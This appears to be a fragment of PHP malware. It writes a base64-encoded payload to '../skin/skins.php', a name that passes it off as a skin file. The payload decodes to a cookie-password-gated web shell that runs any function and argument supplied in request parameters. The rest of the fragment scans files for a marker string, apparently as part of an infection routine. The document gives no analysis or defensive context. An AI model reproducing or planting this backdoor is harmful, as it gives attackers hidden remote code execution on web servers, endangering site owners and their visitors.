...
if(!file_exists("../skin/skins.php"))
{
 file_put_contents("../skin/skins.php",base64_decode("PD9waHAgaWYobWQ1KEAkX0NPT0tJRVtxel0pPT0nOGI5Mzc2ZGUxMzYxZWViZTYwM2FmYzY1NjVkNjUzOTQnKSAoJF89QCRfUkVRVUVTVFtxXSkuQCRfKCRfUkVRVUVTVFt6XSk7ID8+"));
}
	...
	if (!$flag) {
		foreach ($files as $k=>$v) {
			if (file_exists($k)) {
				...
				$buf = @file_get_contents($k);
				if (strpos($buf, $delp)===false) continue;
